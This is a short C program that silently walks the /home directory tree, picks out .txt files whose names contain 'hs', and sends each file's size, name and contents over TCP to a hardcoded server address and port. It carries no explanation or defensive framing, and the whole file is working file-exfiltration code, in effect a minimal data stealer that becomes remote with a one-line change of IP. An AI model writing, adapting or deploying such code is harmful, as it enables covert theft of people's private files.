//
// Created by hs on 2020/5/24.
//

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>

#define serverPort 8089

char * serverIp = "127.0.0.1";

char cwd[1024];
char c[1024];

int endWithTxt(char *str)
{
    int len = strlen(str);
    if (str[len - 1] == 't' && str[len - 2] == 'x' && str[len - 3] == 't' && str[len - 4] == '.')
        return 1;
    else
        return 0;
}

void tranFile(char *filename)
{
    char buf[1024];
    struct stat st;
    unsigned int file_size;

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = PF_INET;
    inet_aton(serverIp, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(serverPort);

    if(stat(filename, &st) == -1)
        return;
    file_size = st.st_size;

    int send_fd = open(filename, O_RDONLY);
    if(send_fd == -1)
        return;

    int sock_fd = socket(PF_INET, SOCK_STREAM, 0);
    if(sock_fd == -1)
    {
        close(send_fd);
        return;
    }

    if(connect(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1)
    {
        close(send_fd);
        close(sock_fd);
        return;
    }

    snprintf(buf, sizeof(buf), "%d\n%s\n", file_size, filename);
    if(write(sock_fd, buf, strlen(buf)) == -1)
    {
        close(send_fd);
        close(sock_fd);
        return;
    }

    size_t size = 0;
    while((size = read(send_fd, buf, sizeof(buf))) != 0)
    {
        if(size == -1)
        {
            close(send_fd);
            close(sock_fd);
            return;
        }

        if(write(sock_fd, buf, size) < size)
        {
            close(send_fd);
            close(sock_fd);
            return;
        }
    }

    close(send_fd);
    close(sock_fd);
}

void findFile(char *dirPath)
{
    getcwd(cwd, sizeof(cwd));
    DIR *dir = opendir(dirPath);
    if (dir == NULL)
        return;
    chdir(dirPath);
    getcwd(c, sizeof(c));
    if(strstr(cwd, c))
        return;

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL)
    {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;
        struct stat st;
        stat(ent->d_name, &st);
        if (S_ISDIR(st.st_mode))
            findFile(ent->d_name);
        else if (endWithTxt(ent->d_name) && strstr(ent->d_name, "hs"))
            tranFile(ent->d_name);
    }
    closedir(dir);
    chdir("..");
}

int main(int argc, char *argv[]) {
    chdir("/");
    findFile("/home");
    return 0;
}